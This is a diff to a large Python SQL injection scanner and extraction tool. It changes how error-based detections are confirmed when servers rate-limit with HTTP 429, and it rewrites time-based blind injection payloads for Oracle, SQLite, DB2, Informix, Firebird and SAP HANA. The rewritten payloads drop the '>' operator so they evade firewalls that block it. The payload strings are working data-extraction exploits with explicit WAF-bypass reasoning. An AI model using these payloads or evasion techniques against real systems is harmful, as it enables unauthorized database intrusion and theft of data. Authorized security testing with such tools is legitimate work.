@@ -115242,7 +115242,17 @@ class TechniqueCascadeEngine:
                             LOG.debug(f"  E [{err_dbms}] pattern {pat!r} also in baseline  FP suppressed")
                             continue
                         # Multi-probe: verify error appears consistently
+                        # BUG-E-429-NEUTRAL FIX: When initial probe returns 429 with SQL error
+                        # (error leaked inside rate-limit response), confirmation probes also
+                        # return 429 but with generic content (no SQL error). Previously
+                        # _e_confirmed stayed at 1 → detection dropped as "1/2 needed".
+                        # Fix: track 429-neutral probes (cannot confirm OR deny). When ALL
+                        # confirmations are 429-neutral, relax threshold to _e_confirmed >= 1.
+                        # The clean probe still required to prevent false positives.
                         _e_confirmed = 1
+                        _e_initial_429 = _get_safe_status_code(fp) == 429
+                        _e_429_neutral = 0
+                        _e_non429_total = 0  # non-429 confirmations (real signal either way)
                         for _e_mp in range(5):
                             # BUG-E-STOP FIX: Check stop flag before each probe. A confirmed
                             # injection on another surface must immediately halt this loop —
@@ -115264,16 +115274,21 @@ class TechniqueCascadeEngine:
                                 bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                             if _e_mp_fp:
                                 self._total_reqs += 1
-                                # BUG-E-MULTIPROBE-FP FIX (v52): was _safe_decode_body(fp, ...) —
-                                # WRONG: this reads the ORIGINAL probe body (which already showed
-                                # the error) instead of the CONFIRMATION probe body (_e_mp_fp).
-                                # Root cause: copy-paste error. All 5 confirmation probes were
-                                # checking `fp` (always shows the error) → _e_confirmed always
-                                # incremented → ALL error detections always "confirmed" (false positive).
-                                # Fix: use _e_mp_fp (the freshly-fetched confirmation probe).
-                                _e_mp_body = _safe_decode_body(_e_mp_fp, encoding="utf-8", errors="replace", func_name="e_multiprobe_confirm") if _e_mp_fp.body else ""
-                                if re.search(pat, _e_mp_body, re.I):
-                                    _e_confirmed += 1
+                                if _get_safe_status_code(_e_mp_fp) == 429:
+                                    # Rate-limited — cannot confirm or deny; treat as neutral
+                                    _e_429_neutral += 1
+                                else:
+                                    _e_non429_total += 1
+                                    # BUG-E-MULTIPROBE-FP FIX (v52): was _safe_decode_body(fp, ...) —
+                                    # WRONG: this reads the ORIGINAL probe body (which already showed
+                                    # the error) instead of the CONFIRMATION probe body (_e_mp_fp).
+                                    # Root cause: copy-paste error. All 5 confirmation probes were
+                                    # checking `fp` (always shows the error) → _e_confirmed always
+                                    # incremented → ALL error detections always "confirmed" (false positive).
+                                    # Fix: use _e_mp_fp (the freshly-fetched confirmation probe).
+                                    _e_mp_body = _safe_decode_body(_e_mp_fp, encoding="utf-8", errors="replace", func_name="e_multiprobe_confirm") if _e_mp_fp.body else ""
+                                    if re.search(pat, _e_mp_body, re.I):
+                                        _e_confirmed += 1
                             print(f"[*]     E multi-probe {_e_mp+2}/6: "
                                   f"{' error found' if _e_confirmed > _e_mp + 1 else ' missing'} "
                                   f"({_e_confirmed}/2 needed)")
@@ -115282,7 +115297,16 @@ class TechniqueCascadeEngine:
                             # achieved on probe 1, burning 4 unnecessary requests per detection.
                             if _e_confirmed >= 2:
                                 break
-                        if _e_confirmed >= 2:
+                        # Relax threshold when: initial was 429+error AND no non-429 probe
+                        # returned real signal (all confirmations were rate-limited neutral).
+                        # _e_non429_total == 0 ensures we never relax when we had real
+                        # non-429 responses showing no error (those are genuine non-confirms).
+                        _e_all_429_neutral = (_e_initial_429 and _e_non429_total == 0
+                                              and _e_429_neutral >= 1 and _e_confirmed == 1)
+                        _e_threshold_met = (_e_confirmed >= 2) or (_e_all_429_neutral and _e_confirmed >= 1)
+                        if _e_all_429_neutral:
+                            print(f"[*]     E multi-probe: {_e_confirmed}/2 needed  ({_e_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+                        if _e_threshold_met:
                             # Clean probe: non-error payload must NOT show pattern
                             _e_clean_p = self._make_false_payload(payload)
                             # BUG-E-CLEAN-PROBE-NONE FIX: When _make_false_payload returns None
@@ -115349,7 +115373,11 @@ class TechniqueCascadeEngine:
                                 LOG.debug(f"  E [{err_dbms}] cross-DBMS pattern {pat!r} also in baseline  FP suppressed")
                                 continue
                             # Multi-probe + clean probe for cross-DBMS
+                            # BUG-EX-429-NEUTRAL FIX: Same as BUG-E-429-NEUTRAL.
                             _ex_confirmed = 1
+                            _ex_initial_429 = _get_safe_status_code(fp) == 429
+                            _ex_429_neutral = 0
+                            _ex_non429_total = 0
                             for _ex_mp in range(5):
                                 # BUG-EX-STOP FIX: stop on confirmed injection elsewhere
                                 if _SCAN_STOPPED[0]:
@@ -115364,16 +115392,25 @@ class TechniqueCascadeEngine:
                                     bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                                 if _ex_fp:
                                     self._total_reqs += 1
-                                    # BUG-E-XDBMS-MULTIPROBE-FP FIX (v52): was _safe_decode_body(fp, ...)
-                                    # WRONG: reads original probe body (already shows the error), not the
-                                    # confirmation probe body. Fix: use _ex_fp (the confirmation probe).
-                                    _ex_body = _safe_decode_body(_ex_fp, encoding="utf-8", errors="replace", func_name="e_crossdbms_multiprobe_confirm") if _ex_fp.body else ""
-                                    if re.search(pat, _ex_body, re.I):
-                                        _ex_confirmed += 1
+                                    if _get_safe_status_code(_ex_fp) == 429:
+                                        _ex_429_neutral += 1
+                                    else:
+                                        _ex_non429_total += 1
+                                        # BUG-E-XDBMS-MULTIPROBE-FP FIX (v52): was _safe_decode_body(fp, ...)
+                                        # WRONG: reads original probe body (already shows the error), not the
+                                        # confirmation probe body. Fix: use _ex_fp (the confirmation probe).
+                                        _ex_body = _safe_decode_body(_ex_fp, encoding="utf-8", errors="replace", func_name="e_crossdbms_multiprobe_confirm") if _ex_fp.body else ""
+                                        if re.search(pat, _ex_body, re.I):
+                                            _ex_confirmed += 1
                                 # BUG-EX-EARLY-EXIT FIX: stop as soon as 2 confirmations
                                 if _ex_confirmed >= 2:
                                     break
-                            if _ex_confirmed >= 2:
+                            _ex_all_429_neutral = (_ex_initial_429 and _ex_non429_total == 0
+                                                   and _ex_429_neutral >= 1 and _ex_confirmed == 1)
+                            _ex_threshold_met = (_ex_confirmed >= 2) or (_ex_all_429_neutral and _ex_confirmed >= 1)
+                            if _ex_all_429_neutral:
+                                print(f"[*]     E(xdbms) multi-probe: {_ex_confirmed}/2 needed  ({_ex_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+                            if _ex_threshold_met:
                                 _ex_clean = self._make_false_payload(payload)
                                 # BUG-E-CLEAN-PROBE-NONE FIX (cross-DBMS path): same issue.
                                 # When _make_false_payload returns None, fall back to original.
@@ -117689,7 +117726,13 @@ class TechniqueCascadeEngine:
                                 print(f"[*]     EH [{_ep}] pattern in baseline  FP suppressed", flush=True)
                                 continue
                             # Multi-probe: verify error pattern appears 2 more times
+                            # BUG-EH-429-NEUTRAL FIX: Same as BUG-E-429-NEUTRAL — initial
+                            # 429+error probe followed by 429-neutral confirmations prevents
+                            # detection. Relax threshold when ALL confirmations are 429-neutral.
                             _eh_confirmed = 1
+                            _eh_initial_429 = _get_safe_status_code(fp) == 429
+                            _eh_429_neutral = 0
+                            _eh_non429_total = 0
                             for _eh_mp in range(5):
                                 # BUG-EH-STOP FIX: Check stop flag before each probe so a
                                 # confirmed injection on another surface stops the loop immediately.
@@ -117708,23 +117751,32 @@ class TechniqueCascadeEngine:
                                     bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                                 if _eh_mp_fp:
                                     self._total_reqs += 1
-                                    # BUG-EH-MULTIPROBE-FP FIX (v52): was _safe_decode_body(fp, ...) —
-                                    # WRONG: reads original probe `fp` body (which already shows the error)
-                                    # instead of the fresh confirmation probe body `_eh_mp_fp`.
-                                    # Root cause: copy-paste error — same bug as E/S technique.
-                                    # Impact: all EH multi-probe confirmations ALWAYS succeeded, producing
-                                    # false positive header error-based detections.
-                                    # Fix: use _eh_mp_fp (the freshly-fetched confirmation probe).
-                                    _eh_mp_body = _safe_decode_body(_eh_mp_fp, encoding="utf-8", errors="replace", func_name="eh_multiprobe_confirm") if _eh_mp_fp.body else ""
-                                    if re.search(_pp, _eh_mp_body, re.I):
-                                        _eh_confirmed += 1
+                                    if _get_safe_status_code(_eh_mp_fp) == 429:
+                                        _eh_429_neutral += 1
+                                    else:
+                                        _eh_non429_total += 1
+                                        # BUG-EH-MULTIPROBE-FP FIX (v52): was _safe_decode_body(fp, ...) —
+                                        # WRONG: reads original probe `fp` body (which already shows the error)
+                                        # instead of the fresh confirmation probe body `_eh_mp_fp`.
+                                        # Root cause: copy-paste error — same bug as E/S technique.
+                                        # Impact: all EH multi-probe confirmations ALWAYS succeeded, producing
+                                        # false positive header error-based detections.
+                                        # Fix: use _eh_mp_fp (the freshly-fetched confirmation probe).
+                                        _eh_mp_body = _safe_decode_body(_eh_mp_fp, encoding="utf-8", errors="replace", func_name="eh_multiprobe_confirm") if _eh_mp_fp.body else ""
+                                        if re.search(_pp, _eh_mp_body, re.I):
+                                            _eh_confirmed += 1
                                 print(f"[*]     EH multi-probe {_eh_mp+2}/6: "
                                       f"{' error pattern found' if _eh_confirmed > _eh_mp + 1 else ' pattern missing'} "
                                       f"({_eh_confirmed}/2 needed)")
                                 # BUG-EH-EARLY-EXIT FIX: Stop as soon as 2 confirmations found.
                                 if _eh_confirmed >= 2:
                                     break
-                            if _eh_confirmed >= 2:
+                            _eh_all_429_neutral = (_eh_initial_429 and _eh_non429_total == 0
+                                                   and _eh_429_neutral >= 1 and _eh_confirmed == 1)
+                            _eh_threshold_met = (_eh_confirmed >= 2) or (_eh_all_429_neutral and _eh_confirmed >= 1)
+                            if _eh_all_429_neutral:
+                                print(f"[*]     EH multi-probe: {_eh_confirmed}/2 needed  ({_eh_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+                            if _eh_threshold_met:
                                 # Clean probe: non-error payload must NOT show error pattern
                                 _eh_clean_payload = self._make_false_payload(payload)
                                 # BUG-EH-CLEAN-PROBE-NONE FIX: When _make_false_payload returns None,
@@ -118081,7 +118133,16 @@ class TechniqueCascadeEngine:
                   f"{' ERROR found' if _has_err else ' no error'}")
             if _has_err:
                 # Multi-probe: verify error is consistent
+                # BUG-IN-429-NEUTRAL FIX: When initial probe returns 429 with SQL error
+                # (server leaks error inside rate-limit response), confirmation probes also
+                # return 429 but with generic rate-limit body (no SQL error). Previously
+                # _in_conf stayed at 1 → detection silently dropped as "1/2 passed".
+                # Fix: track 429-neutral confirmations separately. When all confirmations
+                # are rate-limited (cannot confirm OR deny injection), relax threshold to
+                # _in_conf >= 1 provided the clean probe still passes.
                 _in_conf = 1
+                _in_initial_429 = _get_safe_status_code(fp) == 429
+                _in_429_neutral = 0
                 for _in_mp in range(2):
                     if _SCAN_STOPPED[0]: break  # BUG-FIX-REQ4-SLEEP
                     await asyncio.sleep(0.1)  # BUG-SLEEP-REDUCE FIX: 1.0s→0.1s (fast stop post-confirm)
@@ -118090,14 +118151,26 @@ class TechniqueCascadeEngine:
                         bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                     if _in_fp:
                         self._total_reqs += 1
-                        # BUG-V53-IN-MULTIPROBE-FP FIX: was _safe_decode_body(fp, ...) —
-                        # WRONG: reads original probe `fp` body (already shows the error)
-                        # instead of the fresh confirmation probe body `_in_fp`.
-                        # Same bug class as v52 E/EH/S fixes. Fix: use _in_fp.
-                        _in_b = _safe_decode_body(_in_fp, encoding="utf-8", errors="replace", func_name="in_multiprobe_confirm") if _in_fp.body else ""
-                        if re.search(_err_pat, _in_b, re.I): _in_conf += 1
-                print(f"[*]     IN multi-probe: {_in_conf}/2 passed", flush=True)
-                if _in_conf >= 2:
+                        if _get_safe_status_code(_in_fp) == 429:
+                            # Rate-limited — cannot confirm or deny; treat as neutral
+                            _in_429_neutral += 1
+                        else:
+                            # BUG-V53-IN-MULTIPROBE-FP FIX: was _safe_decode_body(fp, ...) —
+                            # WRONG: reads original probe `fp` body (already shows the error)
+                            # instead of the fresh confirmation probe body `_in_fp`.
+                            # Same bug class as v52 E/EH/S fixes. Fix: use _in_fp.
+                            _in_b = _safe_decode_body(_in_fp, encoding="utf-8", errors="replace", func_name="in_multiprobe_confirm") if _in_fp.body else ""
+                            if re.search(_err_pat, _in_b, re.I): _in_conf += 1
+                # When initial probe was 429+err and ALL confirmations were also 429-neutral
+                # (rate-limiting prevented any real confirmation), relax threshold to 1.
+                # The clean probe below still must pass to avoid false positives.
+                _in_all_429_neutral = _in_initial_429 and _in_429_neutral >= 1 and _in_conf == 1
+                _in_threshold_met = (_in_conf >= 2) or (_in_all_429_neutral and _in_conf >= 1)
+                if _in_all_429_neutral:
+                    print(f"[*]     IN multi-probe: {_in_conf}/2 passed  ({_in_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+                else:
+                    print(f"[*]     IN multi-probe: {_in_conf}/2 passed", flush=True)
+                if _in_threshold_met:
                     # BUG-IN-CLEAN-PROBE-NONE FIX: When _make_false_payload returns None,
                     # _in_clean_ok stayed True and detection confirmed without clean probe.
                     # Fix: use original as fallback clean probe.
@@ -118170,7 +118243,13 @@ class TechniqueCascadeEngine:
                   f"sim={sim:.3f} err={_has_err} body_chg={_body_changed} {_ue_verdict}")
             if _has_err:
                 # Multi-probe + clean for UE error
+                # BUG-UE-429-NEUTRAL FIX: Same as BUG-IN-429-NEUTRAL — initial 429+error
+                # followed by 429-neutral confirmations prevents detection. Relax threshold
+                # when ALL confirmations are 429-neutral.
                 _ue_conf = 1
+                _ue_initial_429 = _get_safe_status_code(fp) == 429
+                _ue_429_neutral = 0
+                _ue_non429_total = 0
                 for _ue_mp in range(2):
                     if _SCAN_STOPPED[0]: break  # BUG-FIX-REQ4-SLEEP
                     await asyncio.sleep(0.1)  # BUG-SLEEP-REDUCE FIX: 1.0s→0.1s (fast stop post-confirm)
@@ -118179,14 +118258,24 @@ class TechniqueCascadeEngine:
                         bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                     if _ue_fp:
                         self._total_reqs += 1
-                        # BUG-V53-UE-MULTIPROBE-FP FIX: was _safe_decode_body(fp, ...) —
-                        # WRONG: reads original probe `fp` body (already shows the error)
-                        # instead of the fresh confirmation probe body `_ue_fp`.
-                        # Same bug class as v52 E/EH/S fixes. Fix: use _ue_fp.
-                        _ue_b = _safe_decode_body(_ue_fp, encoding="utf-8", errors="replace", func_name="ue_multiprobe_confirm") if _ue_fp.body else ""
-                        if re.search(_ue_pat, _ue_b, re.I): _ue_conf += 1
-                print(f"[*]     UE multi-probe: {_ue_conf}/2 passed", flush=True)
-                if _ue_conf >= 2:
+                        if _get_safe_status_code(_ue_fp) == 429:
+                            _ue_429_neutral += 1
+                        else:
+                            _ue_non429_total += 1
+                            # BUG-V53-UE-MULTIPROBE-FP FIX: was _safe_decode_body(fp, ...) —
+                            # WRONG: reads original probe `fp` body (already shows the error)
+                            # instead of the fresh confirmation probe body `_ue_fp`.
+                            # Same bug class as v52 E/EH/S fixes. Fix: use _ue_fp.
+                            _ue_b = _safe_decode_body(_ue_fp, encoding="utf-8", errors="replace", func_name="ue_multiprobe_confirm") if _ue_fp.body else ""
+                            if re.search(_ue_pat, _ue_b, re.I): _ue_conf += 1
+                _ue_all_429_neutral = (_ue_initial_429 and _ue_non429_total == 0
+                                       and _ue_429_neutral >= 1 and _ue_conf == 1)
+                _ue_threshold_met = (_ue_conf >= 2) or (_ue_all_429_neutral and _ue_conf >= 1)
+                if _ue_all_429_neutral:
+                    print(f"[*]     UE multi-probe: {_ue_conf}/2 passed  ({_ue_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+                else:
+                    print(f"[*]     UE multi-probe: {_ue_conf}/2 passed", flush=True)
+                if _ue_threshold_met:
                     _ue_clean = self._make_false_payload(payload)
                     # BUG-UE-CLEAN-PROBE-NONE FIX: Same as BUG-E-CLEAN-PROBE-NONE.
                     # When _make_false_payload returns None, clean probe was skipped and
@@ -118370,7 +118459,13 @@ class TechniqueCascadeEngine:
             if not _validate_response(fp, func_name="waf_block_check"): return None  # BUG-FIX-SYNTAX: continue→return None (outside inner loops)
             if _ds_err and not WAFBlockDiscriminator.is_waf_block(fp):
                 # Multi-probe for error
+                # BUG-DS-429-NEUTRAL FIX: Same as BUG-IN-429-NEUTRAL — initial 429+error
+                # probe followed by 429-neutral confirmations prevents detection. Relax
+                # threshold when ALL confirmations are 429-neutral and no real signal received.
                 _ds_conf = 1
+                _ds_initial_429 = _get_safe_status_code(fp) == 429
+                _ds_429_neutral = 0
+                _ds_non429_total = 0
                 for _ds_mp in range(2):
                     if _SCAN_STOPPED[0]: break  # BUG-FIX-REQ4-SLEEP
                     await asyncio.sleep(0.1)  # BUG-SLEEP-REDUCE FIX: 1.0s→0.1s (fast stop post-confirm)
@@ -118379,14 +118474,24 @@ class TechniqueCascadeEngine:
                         bypass_mutation=True)  # BUG-DEDUP-MULTIPROBE FIX
                     if _ds_fp:
                         self._total_reqs += 1
-                        # BUG-V53-DS-MULTIPROBE-FP FIX: was _safe_decode_body(fp, ...) —
-                        # WRONG: reads original probe `fp` body (already shows the error)
-                        # instead of the fresh confirmation probe body `_ds_fp`.
-                        # Same bug class as v52 E/EH/S fixes. Fix: use _ds_fp.
-                        _ds_b = _safe_decode_body(_ds_fp, encoding="utf-8", errors="replace", func_name="ds_multiprobe_confirm") if _ds_fp.body else ""
-                        if re.search(_ds_pat, _ds_b, re.I): _ds_conf += 1
-                print(f"[*]     DS multi-probe: {_ds_conf}/2 passed", flush=True)
-                if _ds_conf >= 2:
+                        if _get_safe_status_code(_ds_fp) == 429:
+                            _ds_429_neutral += 1
+                        else:
+                            _ds_non429_total += 1
+                            # BUG-V53-DS-MULTIPROBE-FP FIX: was _safe_decode_body(fp, ...) —
+                            # WRONG: reads original probe `fp` body (already shows the error)
+                            # instead of the fresh confirmation probe body `_ds_fp`.
+                            # Same bug class as v52 E/EH/S fixes. Fix: use _ds_fp.
+                            _ds_b = _safe_decode_body(_ds_fp, encoding="utf-8", errors="replace", func_name="ds_multiprobe_confirm") if _ds_fp.body else ""
+                            if re.search(_ds_pat, _ds_b, re.I): _ds_conf += 1
+                _ds_all_429_neutral = (_ds_initial_429 and _ds_non429_total == 0
+                                       and _ds_429_neutral >= 1 and _ds_conf == 1)
+                _ds_threshold_met = (_ds_conf >= 2) or (_ds_all_429_neutral and _ds_conf >= 1)
+                if _ds_all_429_neutral:
+                    print(f"[*]     DS multi-probe: {_ds_conf}/2 passed  ({_ds_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+                else:
+                    print(f"[*]     DS multi-probe: {_ds_conf}/2 passed", flush=True)
+                if _ds_threshold_met:
                     # BUG-DS-ERROR-NO-CLEAN-PROBE FIX: DS error detection confirmed from
                     # 2/3 multi-probe + baseline subtraction but no clean probe.
                     # A server returning SQL errors for any malformed input would confirm
@@ -125665,8 +125770,11 @@ class ScannerV14(ScannerV13):
                                         for _ep_pat in _err_pats:
                                             if re.search(_ep_pat, _surf_body, re.I):
                                                 print(f"[+] [Surface] Potential error via {_surf_type}:{_surf_name}  verifying", flush=True)
-                                                #  Multi-probe: 2/3 must show same error 
+                                                #  Multi-probe: 2/3 must show same error
+                                                _surf_initial_429 = _get_safe_status_code(_surf_fp) == 429
                                                 _surf_conf = 1
+                                                _surf_429_neutral = 0
+                                                _surf_non429_total = 0
                                                 for _sv_i in range(2):
                                                     if _SCAN_STOPPED[0]: break  # BUG-FIX-REQ4-SLEEP
                                                     await asyncio.sleep(0.1)  # BUG-V57-SLEEP-REDUCE FIX: 1.0s→0.1s
@@ -125685,15 +125793,24 @@ class ScannerV14(ScannerV13):
                                                             _sv_fp = await engine.send("GET", _base_ep.url,
                                                                 extra_headers=dict(_surf_data))
                                                         if _validate_response(_sv_fp, "response_body_check"):
-                                                            # BUG-SURFACE-FP-2 FIX: was _safe_decode_body(fp, ...) — must use _sv_fp
-                                                            # (the surface multi-probe confirm response), not stale outer-scope fp.
-                                                            _sv_body = _safe_decode_body(_sv_fp, encoding="utf-8", errors="replace", func_name="extraction")
-                                                            if re.search(_ep_pat, _sv_body, re.I):
-                                                                _surf_conf += 1
+                                                            if _get_safe_status_code(_sv_fp) == 429:
+                                                                _surf_429_neutral += 1
+                                                            else:
+                                                                _surf_non429_total += 1
+                                                                # BUG-SURFACE-FP-2 FIX: was _safe_decode_body(fp, ...) — must use _sv_fp
+                                                                # (the surface multi-probe confirm response), not stale outer-scope fp.
+                                                                _sv_body = _safe_decode_body(_sv_fp, encoding="utf-8", errors="replace", func_name="extraction")
+                                                                if re.search(_ep_pat, _sv_body, re.I):
+                                                                    _surf_conf += 1
                                                     except Exception:
                                                         pass
-                                            
-                                                #  Baseline check: clean probe must NOT have error 
+                                                _surf_all_429_neutral = (_surf_initial_429 and _surf_non429_total == 0
+                                                                         and _surf_429_neutral >= 1 and _surf_conf == 1)
+                                                _surf_threshold_met = (_surf_conf >= 2) or (_surf_all_429_neutral and _surf_conf >= 1)
+                                                if _surf_all_429_neutral:
+                                                    print(f"[*]     Surface multi-probe: {_surf_conf}/2 needed  ({_surf_429_neutral} probes 429-neutral → threshold relaxed)", flush=True)
+
+                                                #  Baseline check: clean probe must NOT have error
                                                 _surf_clean = True
                                                 # BUG-NEW-1 FIX: initialise _sv_clean = None before the try block.
                                                 # If engine.send() raises, _sv_clean is never assigned; the subsequent
@@ -125720,7 +125837,7 @@ class ScannerV14(ScannerV13):
                                                 print(f"    [Surface] multi-probe: {_surf_conf}/2 "
                                                       f"clean={'ok' if _surf_clean else 'FAIL (in baseline)'}")
                                             
-                                                if _surf_conf >= 2 and _surf_clean:
+                                                if _surf_threshold_met and _surf_clean:
                                                     # Additional confirmation: 3rd probe + different error payload
                                                     # BUG-SURF-URL-UNDEF FIX: _surf_url, _extra_surf_hdrs, and _patterns
                                                     # were used here but never defined in this scope. They should be built
@@ -138512,9 +138629,15 @@ class ExtractionBypassFinder:
                 # Use DBMS_SESSION.SLEEP (Oracle 12c+ public) as first choice.
                 f"'; BEGIN IF ({{cond}}) THEN DBMS_SESSION.SLEEP({T}); END IF; END;-- -",
                 # Arithmetic inside DBMS_PIPE (needs EXECUTE ON DBMS_PIPE, but widely granted)
-                f"' AND DBMS_PIPE.RECEIVE_MESSAGE('x',({{cond}})*{T})>0-- -",
-                f"' AND (SELECT CASE WHEN ({{cond}}) THEN COUNT(*) ELSE 0 END FROM all_objects A,all_objects B WHERE ROWNUM<={rows})>0-- -",
-                f"' AND (SELECT CASE WHEN ({{cond}}) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{T}) ELSE 0 END FROM dual)>0-- -",
+                # BUG-EBF-ORACLE-GT-FIX: WAFs that block '>' would block this probe for both
+                # true and false conditions, making the oracle non-functional.
+                # DBMS_PIPE.RECEIVE_MESSAGE always returns a non-NULL integer (0=received,
+                # 1=timeout, 2=msg-too-large) so IS NOT NULL is always TRUE — syntactically
+                # valid without the '>' character. Timing oracle: ({cond})*T = T when true
+                # (sleeps T seconds), 0 when false (returns immediately). No NULL timeout risk.
+                f"' AND DBMS_PIPE.RECEIVE_MESSAGE('x',({{cond}})*{T}) IS NOT NULL-- -",
+                f"' AND (SELECT CASE WHEN ({{cond}}) THEN COUNT(*) ELSE CAST(NULL AS NUMBER) END FROM all_objects A,all_objects B WHERE ROWNUM<={rows}) IS NOT NULL-- -",
+                f"' AND (SELECT CASE WHEN ({{cond}}) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',{T}) ELSE CAST(NULL AS NUMBER) END FROM dual) IS NOT NULL-- -",
             ]
         elif dbms == "SQLite":
             return [
@@ -138524,7 +138647,10 @@ class ExtractionBypassFinder:
                 # - zeroblob(9999999999): 10GB allocation — catastrophic server OOM risk.
                 #   Replace with LIKE('X',HEX(RANDOMBLOB(50000000))) which uses 50MB.
                 f"' AND LIKE('X',HEX(RANDOMBLOB(({{cond}})*50000000)))-- -",
-                f"' AND (CASE WHEN ({{cond}}) THEN (SELECT COUNT(*) FROM sqlite_master A,sqlite_master B,sqlite_master C,sqlite_master D) ELSE 0 END)>0-- -",
+                # BUG-EBF-SQLITE-GT-FIX: '>' operator blocked by WAFs → use IS NOT NULL with
+                # CAST(NULL AS INTEGER) in ELSE so TRUE returns COUNT(*) (non-NULL) and FALSE
+                # returns NULL — oracle works without any '>' character in the payload.
+                f"' AND (CASE WHEN ({{cond}}) THEN (SELECT COUNT(*) FROM sqlite_master A,sqlite_master B,sqlite_master C,sqlite_master D) ELSE CAST(NULL AS INTEGER) END) IS NOT NULL-- -",
                 f"'; SELECT (CASE WHEN ({{cond}}) THEN LIKE('X',HEX(RANDOMBLOB(50000000))) ELSE 0 END)-- -",
             ]
         else:
@@ -139273,12 +139399,19 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # grant required) as the timing mechanism.
             # ROWNUM capped at t*50000 gives ~0.5-2s delay depending on server speed.
             # The CASE WHEN gates whether the heavy query fires (true) or returns fast (false).
-            # Fallback: if all_objects is restricted, try dba_objects (needs SELECT_CATALOG_ROLE).
+            # BUG-ORACLE-GT-OPERATOR-FIX: Old form used `>=1` (contains '>') on the outer
+            # CASE WHEN result. WAFs that block the '>' operator caused all timing probes
+            # to be blocked → fast responses for both true/false → oracle always False →
+            # binary search converges to lo=0 → empty extraction.
+            # Fix: use ELSE CAST(NULL AS NUMBER) + IS NOT NULL so the outer comparison
+            # never contains '>' or '>='. THEN returns COUNT(*) (always non-NULL when the
+            # cross-join produces rows); ELSE returns NULL. IS NOT NULL distinguishes them
+            # without any comparison operator.
             _rows = max(1000, min(int(t * 50000), 5000000))
             return (
                 f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
                 f"THEN (SELECT COUNT(*) FROM all_objects A, all_objects B WHERE ROWNUM<{_rows}) "
-                f"ELSE 0 END FROM DUAL)>=1{_tp_sfx}"
+                f"ELSE CAST(NULL AS NUMBER) END FROM DUAL) IS NOT NULL{_tp_sfx}"
             )
         elif dbms in ("DB2", "Sybase", "Informix", "Ingres"):
             # DB2: PIPE/sleep functions vary; use GENERATE_SERIES heavy query
@@ -139307,27 +139440,34 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
             # mixing a non-aggregate WHEN condition with an aggregate THEN branch requires
             # GROUP BY in those engines.  Move COUNT(*) into a scalar subquery so the outer
             # CASE only sees integer scalars, never a raw aggregate call.
+            # BUG-DB2-INFORMIX-GT-OPERATOR-FIX: Old form used `>0` (contains '>') on the
+            # outer CASE WHEN result. Fix: use ELSE CAST(NULL AS INTEGER) + IS NOT NULL so
+            # the outer comparison never contains '>'. Same pattern as Oracle/PG-HQ fixes.
             if dbms == "DB2":
                 return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
                         f"THEN (SELECT COUNT(*) FROM SYSCAT.TABLES A, SYSCAT.TABLES B, SYSCAT.TABLES C) "
-                        f"ELSE 0 END FROM SYSIBM.SYSDUMMY1)>0{_tp_sfx}")
+                        f"ELSE CAST(NULL AS INTEGER) END FROM SYSIBM.SYSDUMMY1) IS NOT NULL{_tp_sfx}")
             return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
                     f"THEN (SELECT COUNT(*) FROM systables A, systables B, systables C) "
-                    f"ELSE 0 END FROM informix.systables WHERE tabid=1)>0{_tp_sfx}")
+                    f"ELSE CAST(NULL AS INTEGER) END FROM informix.systables WHERE tabid=1) IS NOT NULL{_tp_sfx}")
         elif dbms == "Firebird":
             # FIX-v19.12: Firebird has no SLEEP() or IF(). Use heavy cross-join
             # from rdb$fields (system table present in every Firebird DB).
             # FIX-FIREBIRD-COUNT-CASE: Same issue as DB2 — move COUNT(*) into scalar subquery.
+            # BUG-FIREBIRD-GT-OPERATOR-FIX: Old form used `>0` (contains '>'). Fix: use
+            # ELSE CAST(NULL AS INTEGER) + IS NOT NULL to avoid the '>' operator.
             return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
                     f"THEN (SELECT COUNT(*) FROM rdb$fields A, rdb$fields B, rdb$fields C) "
-                    f"ELSE 0 END FROM rdb$database)>0{_tp_sfx}")
+                    f"ELSE CAST(NULL AS INTEGER) END FROM rdb$database) IS NOT NULL{_tp_sfx}")
         elif dbms == "SAP_HANA":
             # FIX-v19.12: SAP HANA has no SLEEP(). Use heavy cross-join from SYS.M_TABLES.
             # FIX-SAPHANA-COUNT-CASE: SAP HANA Column Store requires GROUP BY when mixing
             # aggregate THEN with non-aggregate WHEN; move COUNT into scalar subquery.
+            # BUG-SAPHANA-GT-OPERATOR-FIX: Old form used `>0` (contains '>'). Fix: use
+            # ELSE CAST(NULL AS INTEGER) + IS NOT NULL to avoid the '>' operator.
             return (f"{_tp_pfx}AND (SELECT CASE WHEN ({condition}) "
                     f"THEN (SELECT COUNT(*) FROM SYS.M_TABLES A, SYS.M_TABLES B) "
-                    f"ELSE 0 END FROM SYS.DUMMY)>0{_tp_sfx}")
+                    f"ELSE CAST(NULL AS INTEGER) END FROM SYS.DUMMY) IS NOT NULL{_tp_sfx}")
         elif dbms == "ClickHouse":
             # FIX-v19.12: ClickHouse has sleep() and if() but syntax differs from MySQL.
             # ClickHouse: if(cond, then, else)  same positional syntax, but sleep()
